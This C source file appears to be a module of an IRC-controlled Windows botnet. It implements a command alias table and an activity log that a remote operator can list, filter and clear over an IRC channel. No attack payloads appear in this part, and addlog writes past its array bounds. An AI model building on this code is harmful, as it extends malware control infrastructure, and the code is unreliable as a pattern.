#include "includes.h"
#include "functions.h"
#include "externs.h"

// globals
#ifdef DEBUG_LOGGING
FILE *fp;
#endif

char log[LOGSIZE][LOGLINE];     // log entries

// function to add an alias and return alias number
int addalias(char *name, char *command)
{
	int i;
	for (i = 0; i < MAXALIASES; i++) {
		if (aliases[i].name[0] == '\0' || strcmp(aliases[i].name, name) == 0) {
			memset(&aliases[i], 0, sizeof(aliases[i]));
			strncpy(aliases[i].name, name, sizeof(aliases[i].name)-1);
			strncpy(aliases[i].command, command, sizeof(aliases[i].command)-1);
			anum++;
			break;
		}
	}
	return i;
}

void aliaslist(SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE];

	irc_privmsg(sock, chan, "-[Alias List]-", notice);
	for (int i = 0; i < MAXALIASES; i++) {
		if (aliases[i].name[0] != '\0') {
			_snprintf(buffer, sizeof(buffer),"%d. %s = %s", i, aliases[i].name, aliases[i].command);
			irc_privmsg(sock, chan, buffer, notice,TRUE);
		}
	}

	return;
}

// function to add a log item
void addlog(char *desc)
{
	SYSTEMTIME st;

	GetLocalTime(&st);

	for (register int i = LOGSIZE; i >= 0; i--) 
		if (log[i][0] != '\0') 
			strncpy(log[i+1], log[i], sizeof(log[i+1])-1);
	_snprintf(log[0], sizeof(log[0]), "[%.2d-%.2d-%4d %.2d:%.2d:%.2d] %s", st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond, desc);

	return;
}

void showlog(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *filter)
{
	int entries = LOGSIZE, tmp = 0;

	if (!silent) irc_privmsg(sock, chan, "-[Logs]-", notice);

	if (filter) {
		if ((tmp = atoi(filter)) != 0)
			entries = tmp;
	}

	for (int i = 0, j = 0; i < LOGSIZE && j < entries; i++, j++) 
		if (log[i][0] != '\0') {
			if (!filter || tmp != 0)
				irc_privmsg(sock, chan, log[i], notice, TRUE);
			else if (lstrstr(log[i], filter))
				irc_privmsg(sock, chan, log[i], notice, TRUE);
		}
	
	return;
}

void clearlog(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	for (register int i = 0;i < LOGSIZE; log[i++][0] = '\0');
	if (!silent) irc_privmsg(sock, chan, "[LOGS]: Cleared.", notice);
	addlog("[LOGS]: Cleared.");

	return;
}

BOOL searchlog(char *filter)
{
	for (int i = 0; i < LOGSIZE; i++) 
		if (log[i][0] != '\0') {
			if (lstrstr(log[i], filter))
				return TRUE;
		}
	
	return FALSE;
}

DWORD WINAPI ShowLogThread(LPVOID param) 
{
	char sendbuf[IRCLINE];
	int entries = LOGSIZE, tmp = 0;

	SHOWLOG showlog = *((SHOWLOG *)param);
	SHOWLOG *showlogp = (SHOWLOG *)param;
	showlogp->gotinfo = TRUE;

	if (!showlog.silent) irc_privmsg(showlog.sock,showlog.chan,"[LOG]: Begin",showlog.notice);

	if (showlog.filter[0] != '\0') {
		if ((tmp = atoi(showlog.filter)) != 0)
			entries = tmp;
	}

	for (int i = 0, j = 0; i < LOGSIZE && j < entries; i++, j++) 
		if (log[i][0] != '\0') {
			if (showlog.filter[0] == '\0' || tmp != 0)
				irc_privmsg(showlog.sock, showlog.chan, log[i], showlog.notice, TRUE);
			else if (lstrstr(log[i], showlog.filter))
				irc_privmsg(showlog.sock, showlog.chan, log[i], showlog.notice, TRUE);
		}
	
	sprintf(sendbuf,"[log]: List complete.");
	if (!showlog.silent) irc_privmsg(showlog.sock,showlog.chan,sendbuf,showlog.notice);
	addlog(sendbuf);

	clearthread(showlog.threadnum);

	ExitThread(0);
}

#ifdef DEBUG_LOGGING
void opendebuglog(void)
{
	fp = fopen(logfile, "ab");

	return;
}

void debuglog(char *buffer, BOOL crlf)
{
	if (fp != NULL) {
		if (crlf)
			fprintf(fp,"%s\r\n",buffer);
		else
			fprintf(fp,"%s",buffer);
		fflush(fp);
	}

	return;
}

void closedebuglog(void)
{
	fclose(fp);

	return;
}
#endif